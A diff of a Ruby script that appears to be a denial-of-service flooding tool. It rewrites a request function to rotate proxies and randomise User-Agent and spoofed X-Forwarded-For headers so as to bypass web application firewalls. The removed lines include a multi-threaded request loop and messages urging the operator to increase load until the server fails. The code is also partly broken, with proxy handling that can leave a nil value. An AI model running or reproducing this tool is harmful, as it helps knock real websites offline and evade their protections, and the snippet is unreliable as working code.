@@ -88,54 +88,36 @@ def attack_details_banner(url, threads, requests_per_thread, proxy_enabled, meth
 end
 
 # Function to send requests with WAF bypass
-def stress_test(url, threads, requests_per_thread, proxies, method)
-    thread_pool = []
-  
-    threads.times do
-      thread_pool << Thread.new do
-        proxies_cycle = proxies.cycle # Create a unique cycle per thread
-  
-        requests_per_thread.times do
-          proxy = proxies.any? ? proxies_cycle.next : nil
-          send_request(url, method, proxy)
-        end
-      end
-    end
-  
-    thread_pool.each(&:join)
+def send_request(url, method, proxy = nil)
+  uri = URI.parse(url)
+  http = Net::HTTP.new(uri.host, uri.port)
+  http.use_ssl = (uri.scheme == "https")
+
+  if proxy
+    proxy_uri = URI.parse("http://#{proxy}") unless proxy.start_with?("http://", "https://")
+    http = Net::HTTP.new(uri.host, uri.port, proxy_uri.host, proxy_uri.port)
   end
-  
+
   begin
-    # Generate randomized headers to bypass WAF
     headers = {
       "User-Agent" => "Mozilla/#{rand(5..10)}.0 (Windows NT #{rand(6..10)}.#{rand(0..3)}) Gecko/#{rand(20100101..20221231)} Firefox/#{rand(50..100)}",
       "X-Forwarded-For" => "#{rand(1..255)}.#{rand(1..255)}.#{rand(1..255)}.#{rand(1..255)}",
       "Referer" => "https://google.com/search?q=#{rand(1000)}"
     }
 
-    # Construct the request based on the method
-    case method.upcase
-    when "GET"
-      request = Net::HTTP::Get.new(uri.request_uri, headers)
-    when "POST"
-      request = Net::HTTP::Post.new(uri.request_uri, headers)
-      request.set_form_data({ key: "value" }) # Add form data as needed
-    when "HEAD"
-      request = Net::HTTP::Head.new(uri.request_uri, headers)
-    else
-      raise "[!] Unsupported HTTP method: #{method}"
-    end
+    request = case method.upcase
+              when "GET"
+                Net::HTTP::Get.new(uri.request_uri, headers)
+              when "POST"
+                Net::HTTP::Post.new(uri.request_uri, headers).tap { |r| r.set_form_data({ key: "value" }) }
+              when "HEAD"
+                Net::HTTP::Head.new(uri.request_uri, headers)
+              else
+                raise "[!] Unsupported HTTP method: #{method}"
+              end
 
     response = http.request(request)
     puts "[+] Request sent via #{proxy || 'direct connection'} - Response: #{response.code}"
-
-    if response.code.to_i >= 500
-      puts "[!] Server under stress: #{response.code}"
-    elsif response.code.to_i == 403
-      puts "[!] WAF detected! Consider adjusting headers or using fragmented requests."
-    elsif response.code.to_i == 200
-      puts "[INFO] Server is responding normally. Increase load for further stress."
-    end
 
     return response.code.to_i
   rescue => e
@@ -144,7 +126,7 @@ def stress_test(url, threads, requests_per_thread, proxies, method)
   end
 end
 
-# Function to check server status
+# Function to monitor server status
 def check_server_status(url)
   puts "[+] Monitoring server status..."
   loop do
